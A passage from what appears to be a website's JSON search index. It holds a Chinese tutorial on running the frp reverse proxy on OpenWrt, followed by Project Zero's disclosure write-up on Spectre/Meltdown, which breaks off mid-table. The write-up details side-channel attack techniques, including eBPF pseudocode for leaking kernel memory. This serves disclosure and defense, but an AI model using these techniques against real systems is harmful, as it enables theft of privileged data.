5M","title":"\u51c6\u5907\u5de5\u4f5c"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/#_2","text":"\u8fdb\u5165 https://github.com/fatedier/frp/releases/latest \u4e0b\u8f7d\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u5bf9\u5e94\u7684\u7248\u672c \u516c\u7f51\u8bbe\u5907\u5982\u679c\u662f\u670d\u52a1\u5668\u6216\u8005 VPS\uff0c\u7cfb\u7edf\u662f Windows \u4e0b\u8f7d Windows \u7248\u672c\uff0cLinux \u4e0b\u8f7d Linux \u7248\u672c\uff0c\u7136\u540e\u6839\u636e\u7cfb\u7edf\u4f4d\u6570\u518d\u9009\u62e9 i386 \u6216 amd64\u3002 \u8def\u7531\u5668\u6839\u636e CPU \u67b6\u6784\u4e0b\u8f7d\u5bf9\u5e94\u7684 Linux \u7248\u672c\uff0c\u8fd9\u4e2a\u6211\u8bf4\u8fc7\u5f88\u591a\u6b21\u4e86\u3002 \u538b\u7f29\u5305\u4f1a\u6709\u4e24\u4e2a\u53ef\u6267\u884c\u6587\u4ef6 frps \u548c frpc\uff0cs \u662f\u670d\u52a1\u7aef\uff0cc \u662f\u5ba2\u6237\u7aef\u3002\u670d\u52a1\u7aef\u4e0a\u4f20\u5230\u516c\u7f51\u8bbe\u5907\uff0c\u5ba2\u6237\u7aef\u4e0a\u4f20\u5230\u8def\u7531\u5668\uff0c\u914d\u7f6e\u6587\u4ef6\u4e5f\u9700\u8981\u4e0a\u4f20\uff0cfrps.ini \u548c frpc.ini\u3002 \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u5b58\u653e frp \u7684\u76ee\u5f55\uff1a mkdir /usr/local/frp \u7136\u540e\u5c06 frp \u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e0a\u4f20\u5230 /usr/local/frp \uff0c\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u4e0a\u4f20\u5230\u522b\u7684\u4f4d\u7f6e\u3002 \u8bbe\u7f6e\u53ef\u6267\u884c\u6587\u4ef6\u6743\u9650\uff1a chmod +x /usr/local/frp/frp* \u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8f6f\u8fde\u63a5\uff1a ln -s /usr/local/frp/frps /usr/bin/frps \u6216 ln -s /usr/local/frp/frpc /usr/bin/frpc \u4e0b\u9762\u914d\u7f6e\u4ee5\u5355\u4eba\u4f7f\u7528\u4e3a\u4f8b\uff0c\u5982\u679c\u9700\u8981\u914d\u7f6e\u591a\u4eba\u4f7f\u7528\uff0c\u8bf7\u81ea\u884c\u67e5\u770b \u5b98\u65b9\u6587\u6863 \u8fdb\u884c\u4fee\u6539\u3002 \u914d\u7f6e\u670d\u52a1\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrps.ini bind_port = 7000 \u662f frps \u7684\u7aef\u53e3\uff0c\u53ef\u4ee5\u6539\uff0c\u4e5f\u53ef\u4ee5\u7528\u9ed8\u8ba4\u7684\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u9879\uff1a token \uff0c\u8fd9\u4e2a\u7528\u6765\u505a\u8eab\u4efd\u9a8c\u8bc1\uff0c\u63a8\u8350\u5f00\u542f\u3002\u53ea\u6709 frps \u548c frpc \u4e00\u81f4\u624d\u53ef\u4ee5\u5efa\u7acb\u8fde\u63a5\uff0c\u6ce8\u610f\uff0c\u5b83\u4eec\u4e4b\u95f4\u65f6\u95f4\u5dee\u4e0d\u80fd\u8d85\u8fc7 15 \u5206\u949f\uff0c\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0 authentication_timeout \u914d\u7f6e\u9879\u6765\u66f4\u6539\u8fd9\u4e2a\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u79d2\uff0c\u9ed8\u8ba4\u4e3a 900\u3002\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662f\u56fd\u5916 VPS \u7684\u8bdd\uff0c\u9700\u8981\u6ce8\u610f\u8fd9\u4e00\u70b9\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frps.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u4e0d\u4f1a\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002 \u6dfb\u52a0 vhost_http_port \u548c vhost_https_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u5ba2\u6237\u7aef\u7684\u8f6c\u53d1\u534f\u8bae\u4e3a HTTP \u6216 HTTPS \u65f6\u7684\u8bbf\u95ee\u7aef\u53e3\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.ini \u914d\u7f6e\u5ba2\u6237\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrpc.ini server_addr \u548c server_port \u662f frps \u7684 IP \u548c\u7aef\u53e3\u3002 \u4e0b\u9762\u9ed8\u8ba4\u6709\u4e00\u4e2a SSH \u914d\u7f6e\uff0c\u628a\u5b83\u5220\u4e86\u3002 \u5982\u679c\u4f60\u5728 frps \u8bbe\u7f6e\u4e86 token \uff0c\u90a3 frpc \u4e5f\u9700\u8981\u540c\u6837\u7684\u914d\u7f6e\u9879\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frpc.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u5c06\u4e0d\u4f1a\u6709\u4efb\u4f55\u8f93\u51fa\u4fe1\u606f\u3002 \u53ef\u4ee5\u6dfb\u52a0 login_fail_exit \u914d\u7f6e\u9879\u51b3\u5b9a\u662f\u5426\u8ba9 fprc \u8fde\u63a5 frps \u5931\u8d25\u540e\u9000\u51fa\u7a0b\u5e8f\uff0c\u63a8\u8350\u8bbe\u7f6e\u4e3a false \uff0c\u9632\u6b62\u5f02\u5e38\u9000\u51fa\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u8282\u70b9\uff1a [web] \u6dfb\u52a0 type \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8f6c\u53d1\u534f\u8bae\uff0c\u652f\u6301\uff1ahttp\u3001https\u3001tcp\u3001udp \u7b49\uff0c\u8f6c\u53d1 Web \u4f7f\u7528 HTTP(S)\uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 TCP\u3002 \u6dfb\u52a0 local_ip \u548c local_port \u8bbe\u7f6e\u672c\u5730 IP \u548c\u7aef\u53e3\uff0cIP \u8bbe\u7f6e\u4e3a 127.0.0.1\uff0c\u7aef\u53e3\u8bbe\u7f6e\u4e3a\u4f60\u8981\u8f6c\u53d1\u7684\u7aef\u53e3\u5373\u53ef\uff0cWeb \u4e00\u822c\u4e3a 80 \u548c 443 (HTTPS) \u53ef\u4ee5\u6dfb\u52a0 custom_domains \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u5982\u679c\u914d\u7f6e\u4e86\u591a\u4e2a Web \u670d\u52a1\uff0c\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u57df\u540d\u6765\u8bbf\u95ee\u3002 \u53ef\u4ee5\u6dfb\u52a0 use_encryption = true \u548c use_compression = true \u52a0\u5bc6\u548c\u538b\u7f29\u6570\u636e\uff0c\u4f46\u4f1a\u6d88\u8017\u989d\u5916\u7684 CPU \u8d44\u6e90\u3002 \u53ef\u4ee5\u6dfb\u52a0 http_user \u548c http_pwd \u6765\u4fdd\u62a4 Web \u670d\u52a1\uff0c\u4ec5\u652f\u6301 HTTP\u3002 \u5982\u679c\u4f60\u9700\u8981\u8f6c\u53d1 TCP \u548c UDP\uff0c\u53ea\u9700\u8981\u5728\u914d\u7f6e\u8282\u70b9\u91cc\u6dfb\u52a0 remote_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8fdc\u7a0b\u7aef\u53e3\u5373\u53ef\u3002\u6bd4\u5982\u8f6c\u53d1 SSH\uff0c remote_port \u8bbe\u7f6e\u4e3a 222\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u8bbf\u95ee ssh://\u8fdc\u7a0bIP:222 \u5c31\u53ef\u4ee5\u4e86\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frpc.ini \u4f60\u53ef\u4ee5\u76f4\u63a5\u5728\u6211\u7684\u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\u57fa\u7840\u4e0a\u8fdb\u884c\u4fee\u6539\u3002 \u66f4\u591a\u914d\u7f6e\u53c2\u6570\u53ef\u4ee5\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u5b8c\u6210\u540e\uff0c\u540c\u6837\u4e0a\u4f20\u5230\u4f60\u7684\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u7684 frp \u76ee\u5f55\u3002 \u4e00\u5207\u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u5148\u5728\u524d\u7aef\u8fd0\u884c\u6d4b\u8bd5\u4e00\u4e0b\u3002 \u670d\u52a1\u7aef\uff1a frps -c /usr/local/frp/frps.ini \u5ba2\u6237\u7aef\uff1a frpc -c /usr/local/frp/frpc.ini \u5982\u679c\u63d0\u793a\u547d\u4ee4\u4e0d\u5b58\u5728\uff0c\u8bf7\u68c0\u67e5\u4f60\u7684\u8f6f\u8fde\u63a5\u662f\u5426\u521b\u5efa\u6709\u8bef\u3002 \u52a1\u5fc5\u5148\u8fd0\u884c\u670d\u52a1\u7aef\u518d\u8fd0\u884c\u5ba2\u6237\u7aef\uff0c\u5426\u5219\u5ba2\u6237\u7aef\u4f1a\u81ea\u52a8\u9000\u51fa\u3002 \u8fd0\u884c\u6210\u529f\u540e\u8bbf\u95ee\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u6ca1\u95ee\u9898\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u653e\u5728\u540e\u53f0\u8fd0\u884c\u4e86\u3002 \u540e\u53f0\u8fd0\u884c \u7b2c\u4e00\u79cd\uff1a \u8fd0\u884c\uff1a frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 & \u7ed3\u675f\uff1a killall frpc \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 &' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && frpc -c \\/usr\\/local\\/frp\\/frpc.ini >\\/dev\\/null 2>&1 &/d' /etc/rc.local \u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u540e\u53f0\u8fd0\u884c frp\uff0c\u597d\u50cf\u7279\u522b\u5bb9\u6613\u6302\u6389\u3002 \u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\u63a8\u8350\u5f00\u542f\u65e5\u5fd7\u4fdd\u5b58 \u7b2c\u4e8c\u79cd\uff1a\u4f7f\u7528 screen \u8def\u7531\u5668\u5b89\u88c5\u547d\u4ee4\uff1a opkg update && opkg install screen \uff0c\u670d\u52a1\u5668\u5b89\u88c5\u547d\u4ee4\uff1a sudo apt-get install screen -y \u6216 sudo yum install screen -y \u3002 screen \u7684\u8be6\u7ec6\u7528\u6cd5\u5927\u5bb6\u53ef\u4ee5\u53bb\u767e\u5ea6\u4e00\u4e0b\uff0c\u6211\u8fd9\u91cc\u53ea\u8bf4\u600e\u4e48\u7528\u5b83\u6765\u540e\u53f0\u8fd0\u884c frp\u3002 \u8fd0\u884c\uff1a screen -dmS frpc frpc -c /usr/local/frp/frpc.ini \u67e5\u770b\u8fd0\u884c\u72b6\u6001\uff1a screen -r frpc \u67e5\u770b\u8fd0\u884c\u72b6\u6001\u540e\uff0c\u6309 Ctrl + C \u7ed3\u675f frpc\uff0c\u6309 Ctrl + A + D (A \u548c D \u4f9d\u6b21\u6309\u4e0b) \u4e3a\u6682\u65f6\u9000\u51fa\uff0c\u4f9d\u7136\u4fdd\u6301\u540e\u53f0\u8fd0\u884c\u3002 \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && screen -dmS frpc frpc -c /usr/local/frp/frpc.ini' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && screen -dmS frpc frpc -c \\/usr\\/local\\/frp\\/frpc.ini/d' /etc/rc.local \u5f00\u673a\u5ef6\u8fdf 10 \u79d2\u8fd0\u884c\u662f\u786e\u4fdd\u8def\u7531\u5668\u8054\u7f51\uff0c\u907f\u514d frpc \u81ea\u52a8\u9000\u51fa\u3002 \u7b2c\u4e09\u79cd\uff08\u4ec5\u9002\u7528\u4e8e\u6709 systemd \u7684 Linux \u53d1\u884c\u7248\uff09\uff1a \u4e0b\u8f7d\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5bf9\u5e94\u7684 systemd \u670d\u52a1\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u8def\u5f84\u662f\u9ed8\u8ba4\u7684 /usr/local/frp/ \uff0c\u5982\u679c\u4f60\u7684\u8def\u5f84\u4e0d\u662f\u8fd9\u4e2a\uff0c\u6ce8\u610f\u66f4\u6539\u3002 \u670d\u52a1\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5ba2\u6237\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5f00\u673a\u542f\u52a8 frp\uff1a systemctl enable frpc.service \u6216 systemctl enable frps.service \u542f\u52a8 frp\uff1a systemctl start frpc.service \u6216 systemctl start frps.service \u505c\u6b62 frp\uff1a systemctl stop frpc.service \u6216 systemctl stop frps.service \u91cd\u542f frp\uff1a systemctl restart frpc.service \u6216 systemctl restart frps.service \u67e5\u770b systemd \u670d\u52a1\u72b6\u6001\uff1a systemctl status frpc.service \u6216 systemctl status frps.service \u5982\u679c\u63d0\u793a running \u5219\u8868\u793a\u8fd0\u884c\u6b63\u5e38 \u5982\u679c\u4f60\u60f3\u8fdc\u7a0b\u7535\u8111\uff0c\u53ef\u4ee5\u5728\u7535\u8111\u4e0a\u5b89\u88c5 TeamViewer \uff0c\u7136\u540e\u5f00\u542f\u4e3b\u677f BIOS \u91cc\u7684 PCI \u8bbe\u5907\u5524\u9192\uff0c\u8def\u7531\u5668\u5b89\u88c5 WOL \u7f51\u7edc\u5524\u9192\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u5f00\u673a\uff0c\u5e76\u4e14\u4f7f\u7528 TeamViewer \u63a7\u5236\u7535\u8111\u3002 \u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u8f6c\u53d1\u5185\u7f51\u5185\u5176\u4ed6\u8bbe\u5907\u7684\u670d\u52a1\uff0c\u5c06 frpc \u7684 local_ip \u914d\u7f6e\u9879\u6539\u4e3a\u5185\u7f51\u5176\u4ed6\u8bbe\u5907\u7684 IP \u5373\u53ef\u3002 GitHub: https://github.com/fatedier/frp \u5fae\u4fe1\u626b\u63cf\u4e8c\u7ef4\u7801\u5173\u6ce8\u6211\u4eec \u5982\u679c\u89c9\u5f97\u6587\u7ae0\u6709\u5e2e\u52a9\u5230\u4f60\uff0c\u53ef\u4ee5\u70b9\u51fb\u4e0b\u65b9\u7684\u6253\u8d4f\u6309\u94ae\u8d5e\u52a9\u4e0b\u670d\u52a1\u5668\u8d39\u7528\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.mivm.cn/openwrt-frp/","title":"\u642d\u5efa\u5185\u7f51\u7a7f\u900f"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/","text":"Reading privileged memory with a side-channel Posted by Jann Horn, Project Zero We have discovered that CPU data cache timing can be abused to efficiently leak information out of mis-speculated execution, leading to (at worst) arbitrary virtual memory read vulnerabilities across local security boundaries in various contexts. Variants of this issue are known to affect many modern processors, including certain processors by Intel, AMD and ARM. For a few Intel and AMD CPU models, we have exploits that work against real software. We reported this issue to Intel, AMD and ARM on 2017-06-01 [1]. So far, there are three known variants of the issue: Variant 1: bounds check bypass (CVE-2017-5753) Variant 2: branch target injection (CVE-2017-5715) Variant 3: rogue data cache load (CVE-2017-5754) Before the issues described here were publicly disclosed, Daniel Gruss, Moritz Lipp, Yuval Yarom, Paul Kocher, Daniel Genkin, Michael Schwarz, Mike Hamburg, Stefan Mangard, Thomas Prescher and Werner Haas also reported them; their [writeups/blogposts/paper drafts] are at: Spectre (variants 1 and 2) Meltdown (variant 3) During the course of our research, we developed the following proofs of concept (PoCs): A PoC that demonstrates the basic principles behind variant 1 in userspace on the tested Intel Haswell Xeon CPU, the AMD FX CPU, the AMD PRO CPU and an ARM Cortex A57 [2]. This PoC only tests for the ability to read data inside mis-speculated execution within the same process, without crossing any privilege boundaries. A PoC for variant 1 that, when running with normal user privileges under a modern Linux kernel with a distro-standard config, can perform arbitrary reads in a 4GiB range [3] in kernel virtual memory on the Intel Haswell Xeon CPU. If the kernel's BPF JIT is enabled (non-default configuration), it also works on the AMD PRO CPU. On the Intel Haswell Xeon CPU, kernel virtual memory can be read at a rate of around 2000 bytes per second after around 4 seconds of startup time. [4] A PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific (now outdated) version of Debian's distro kernel [5] running on the host, can read host kernel memory at a rate of around 1500 bytes/second, with room for optimization. Before the attack can be performed, some initialization has to be performed that takes roughly between 10 and 30 minutes for a machine with 64GiB of RAM; the needed time should scale roughly linearly with the amount of host RAM. (If 2MB hugepages are available to the guest, the initialization should be much faster, but that hasn't been tested.) A PoC for variant 3 that, when running with normal user privileges, can read kernel memory on the Intel Haswell Xeon CPU under some precondition. We believe that this precondition is that the targeted kernel memory is present in the L1D cache. For interesting resources around this topic, look down into the \"Literature\" section. A warning regarding explanations about processor internals in this blogpost: This blogpost contains a lot of speculation about hardware internals based on observed behavior, which might not necessarily correspond to what processors are actually doing. We have some ideas on possible mitigations and provided some of those ideas to the processor vendors; however, we believe that the processor vendors are in a much better position than we are to design and evaluate mitigations, and we expect them to be the source of authoritative guidance. The PoC code and the writeups that we sent to the CPU vendors are available here: https://bugs.chromium.org/p/project-zero/issues/detail?id=1272 . Tested Processors Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz (called \"Intel Haswell Xeon CPU\" in the rest of this document) AMD FX(tm)-8320 Eight-Core Processor (called \"AMD FX CPU\" in the rest of this document) AMD PRO A8-9600 R7, 10 COMPUTE CORES 4C+6G (called \"AMD PRO CPU\" in the rest of this document) An ARM Cortex A57 core of a Google Nexus 5x phone [6] (called \"ARM Cortex A57\" in the rest of this document) Glossary retire: An instruction retires when its results, e.g. register writes and memory writes, are committed and made visible to the rest of the system. Instructions can be executed out of order, but must always retire in order. logical processor core: A logical processor core is what the operating system sees as a processor core. With hyperthreading enabled, the number of logical cores is a multiple of the number of physical cores. cached/uncached data: In this blogpost, \"uncached\" data is data that is only present in main memory, not in any of the cache levels of the CPU. Loading uncached data will typically take over 100 cycles of CPU time. speculative execution: A processor can execute past a branch without knowing whether it will be taken or where its target is, therefore executing instructions before it is known whether they should be executed. If this speculation turns out to have been incorrect, the CPU can discard the resulting state without architectural effects and continue execution on the correct execution path. Instructions do not retire before it is known that they are on the correct execution path. mis-speculation window: The time window during which the CPU speculatively executes the wrong code and has not yet detected that mis-speculation has occurred. Variant 1: Bounds check bypass This section explains the common theory behind all three variants and the theory behind our PoC for variant 1 that, when running in userspace under a Debian distro kernel, can perform arbitrary reads in a 4GiB region of kernel memory in at least the following configurations: Intel Haswell Xeon CPU, eBPF JIT is off (default state) Intel Haswell Xeon CPU, eBPF JIT is on (non-default state) AMD PRO CPU, eBPF JIT is on (non-default state) The state of the eBPF JIT can be toggled using the net.core.bpf_jit_enable sysctl. Theoretical explanation The Intel Optimization Reference Manual says the following regarding Sandy Bridge (and later microarchitectural revisions) in section 2.3.2.3 (\"Branch Prediction\"): Branch prediction predicts the branch target and enables the processor to begin executing instructions long before the branch true execution path is known. In section 2.3.5.2 (\"L1 DCache\"): Loads can: [...] * Be carried out speculatively, before preceding branches are resolved. * Take cache misses out of order and in an overlapped manner. Intel's Software Developer's Manual [7] states in Volume 3A, section 11.7 (\"Implicit Caching (Pentium 4, Intel Xeon, and P6 family processors\"): Implicit caching occurs when a memory element is made potentially cacheable, although the element may never have been accessed in the normal von Neumann sequence. Implicit caching occurs on the P6 and more recent processor families due to aggressive prefetching, branch prediction, and TLB miss handling. Implicit caching is an extension of the behavior of existing Intel386, Intel486, and Pentium processor systems, since software running on these processor families also has not been able to deterministically predict the behavior of instruction prefetch. Consider the code sample below. If arr1->length is uncached, the processor can speculatively load data from arr1->data[untrusted_offset_from_caller]. This is an out-of-bounds read. That should not matter because the processor will effectively roll back the execution state when the branch has executed; none of the speculatively executed instructions will retire (e.g. cause registers etc. to be affected). struct array { unsigned long length; unsigned char data[]; }; struct array *arr1 = ...; unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; ... } However, in the following code sample, there's an issue. If arr1->length, arr2->data[0x200] and arr2->data[0x300] are not cached, but all other accessed data is, and the branch conditions are predicted as true, the processor can do the following speculatively before arr1->length has been loaded and the execution is re-steered: load value = arr1->data[untrusted_offset_from_caller] start a load from a data-dependent offset in arr2->data, loading the corresponding cache line into the L1 cache struct array { unsigned long length; unsigned char data[]; }; struct array arr1 = ...; / small array */ struct array arr2 = ...; / array of size 0x400 */ / >0x400 (OUT OF BOUNDS!) / unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; unsigned long index2 = ((value&1)*0x100)+0x200; if (index2 < arr2->length) { unsigned char value2 = arr2->data[index2]; } } After the execution has been returned to the non-speculative path because the processor has noticed that untrusted_offset_from_caller is bigger than arr1->length, the cache line containing arr2->data[index2] stays in the L1 cache. By measuring the time required to load arr2->data[0x200] and arr2->data[0x300], an attacker can then determine whether the value of index2 during speculative execution was 0x200 or 0x300 - which discloses whether arr1->data[untrusted_offset_from_caller]&1 is 0 or 1. To be able to actually use this behavior for an attack, an attacker needs to be able to cause the execution of such a vulnerable code pattern in the targeted context with an out-of-bounds index. For this, the vulnerable code pattern must either be present in existing code, or there must be an interpreter or JIT engine that can be used to generate the vulnerable code pattern. So far, we have not actually identified any existing, exploitable instances of the vulnerable code pattern; the PoC for leaking kernel memory using variant 1 uses the eBPF interpreter or the eBPF JIT engine, which are built into the kernel and accessible to normal users. A minor variant of this could be to instead use an out-of-bounds read to a function pointer to gain control of execution in the mis-speculated path. We did not investigate this variant further. Attacking the kernel This section describes in more detail how variant 1 can be used to leak Linux kernel memory using the eBPF bytecode interpreter and JIT engine. While there are many interesting potential targets for variant 1 attacks, we chose to attack the Linux in-kernel eBPF JIT/interpreter because it provides more control to the attacker than most other JITs. The Linux kernel supports eBPF since version 3.18. Unprivileged userspace code can supply bytecode to the kernel that is verified by the kernel and then: either interpreted by an in-kernel bytecode interpreter or translated to native machine code that also runs in kernel context using a JIT engine (which translates individual bytecode instructions without performing any further optimizations) Execution of the bytecode can be triggered by attaching the eBPF bytecode to a socket as a filter and then sending data through the other end of the socket. Whether the JIT engine is enabled depends on a run-time configuration setting - but at least on the tested Intel processor, the attack works independent of that setting. Unlike classic BPF, eBPF has data types like data arrays and function pointer arrays into which eBPF bytecode can index. Therefore, it is possible to create the code pattern described above in the kernel using eBPF bytecode. eBPF's data arrays are less efficient than its function pointer arrays, so the attack will use the latter where possible. Both machines on which this was tested have no SMAP, and the PoC relies on that (but it shouldn't be a precondition in principle). Additionally, at least on the Intel machine on which this was tested, bouncing modified cache lines between cores is slow, apparently because the MESI protocol is used for cache coherence [8]. Changing the reference counter of an eBPF array on one physical CPU core causes the cache line containing the reference counter to be bounced over to that CPU core, making reads of the reference counter on all other CPU cores slow until the changed reference counter has been written back to memory. Because the length and the reference counter of an eBPF array are stored in the same cache line, this also means that changing the reference counter on one physical CPU core causes reads of the eBPF array's length to be slow on other physical CPU cores (intentional false sharing). The attack uses two eBPF programs. The first one tail-calls through a page-aligned eBPF function pointer array prog_map at a configurable index. In simplified terms, this program is used to determine the address of prog_map by guessing the offset from prog_map to a userspace address and tail-calling through prog_map at the guessed offsets. To cause the branch prediction to predict that the offset is below the length of prog_map, tail calls to an in-bounds index are performed in between. To increase the mis-speculation window, the cache line containing the length of prog_map is bounced to another core. To test whether an offset guess was successful, it can be tested whether the userspace address has been loaded into the cache. Because such straightforward brute-force guessing of the address would be slow, the following optimization is used: 215 adjacent userspace memory mappings [9], each consisting of 24 pages, are created at the userspace address user_mapping_area, covering a total area of 231 bytes. Each mapping maps the same physical pages, and all mappings are present in the pagetables. This permits the attack to be carried out in steps of 231 bytes. For each step, after causing an out-of-bounds access through prog_map, only one cache line each from the first 24 pages of user_mapping_area have to be tested for cached memory. Because the L3 cache is physically indexed, any access to a virtual address mapping a physical page will cause all other virtual addresses mapping the same physical page to become cached as well. When this attack finds a hit\u2014a cached memory location\u2014the upper 33 bits of the kernel address are known (because they can be derived from the address guess at which the hit occurred), and the low 16 bits of the address are also known (from the offset inside user_mapping_area at which the hit was found). The remaining part of the address of user_mapping_area is the middle. The remaining bits in the middle can be determined by bisecting the remaining address space: Map two physical pages to adjacent ranges of virtual addresses, each virtual address range the size of half of the remaining search space, then determine the remaining address bit-wise. At this point, a second eBPF program can be used to actually leak data. In pseudocode, this program looks as follows: uint64_t bitmask = ; uint64_t bitshift_selector = ; uint64_t prog_array_base_offset = ; uint64_t secret_data_offset = ; // index will be bounds-checked by the runtime, // but the bounds check will be bypassed speculatively uint64_t secret_data = bpf_map_read(array=victim_array, index=secret_data_offset); // select a single bit, move it to a specific position, and add the base offset uint64_t progmap_index = (((secret_data & bitmask) >> bitshift_selector) << 7) + prog_array_base_offset; bpf_tail_call(prog_map, progmap_index); This program reads 8-byte-aligned 64-bit values from an eBPF data array \"victim_map\" at a runtime-configurable offset and bitmasks and bit-shifts the value so that one bit is mapped to one of two values that are 27 bytes apart (sufficient to not land in the same or adjacent cache lines when used as an array index). Finally it adds a 64-bit offset, then uses the resulting value as an offset into prog_map for a tail call. This program can then be used to leak memory by repeatedly calling the eBPF program with an out-of-bounds offset into victim_map that specifies the data to leak and an out-of-bounds offset into prog_map that causes prog_map + offset to point to a userspace memory area. Misleading the branch prediction and bouncing the cache lines works the same way as for the first eBPF program, except that now, the cache line holding the length of victim_map must also be bounced to another core. Variant 2: Branch target injection This section describes the theory behind our PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific version of Debian's distro kernel running on the host, can read host kernel memory at a rate of around 1500 bytes/second. Basics Prior research (see the Literature section at the end) has shown that it is possible for code in separate security contexts to influence each other's branch prediction. So far, this has only been used to infer information about where code is located (in other words, to create interference from the victim to the attacker); however, the basic hypothesis of this attack variant is that it can also be used to redirect execution of code in the victim context (in other words, to create interference from the attacker to the victim; the other way around). The basic idea for the attack is to target victim code that contains an indirect branch whose target address is loaded from memory and flush the cache line containing the target address out to main memory. Then, when the CPU reaches the indirect branch, it won't know the true destination of the jump, and it won't be able to calculate the true destination until it has finished loading the cache line back into the CPU, which takes a few hundred cycles. Therefore, there is a time window of typically over 100 cycles in which the CPU will speculatively execute instructions based on branch prediction. Haswell branch prediction internals Some of the internals of the branch prediction implemented by Intel's processors have already been published; however, getting this attack to work properly required significant further experimentation to determine additional details. This section focuses on the branch prediction internals that were experimentally derived from the Intel Haswell Xeon CPU. Haswell seems to have multiple branch prediction mechanisms that work very differently: A generic branch predictor that can only store one target per source address; used for all kinds of jumps, like absolute jumps, relative jumps and so on. A specialized indirect call predictor that can store multiple targets per source address; used for indirect calls. (There is also a specialized return predictor, according to Intel's optimization manual, but we haven't analyzed that in detail yet. If this predictor could be used to reliably dump out some of the call stack through which a VM was entered, that would be very interesting.) Generic predictor The generic branch predictor, as documented in prior research, only uses the lower 31 bits of the address of the last byte of the source instruction for its prediction. If, for example, a branch target buffer (BTB) entry exists for a jump from 0x4141.0004.1000 to 0x4141.0004.5123, the generic predictor will also use it to predict a jump from 0x4242.0004.1000. When the higher bits of the source address differ like this, the higher bits of the predicted destination change together with it\u2014in this case, the predicted destination address will be 0x4242.0004.5123\u2014so apparently this predictor doesn't store the full, absolute destination address. Before the lower 31 bits of the source address are used to look up a BTB entry, they are folded together using XOR. Specifically, the following bits are folded together: | bit A | bit B | | 0x40.0000 | 0x2000 | | 0x80.0000 | 0x4000 | | 0x100.0000 | 0x8000 | | 0x200.0000 | 0x1.0000 | | 0x400.0000 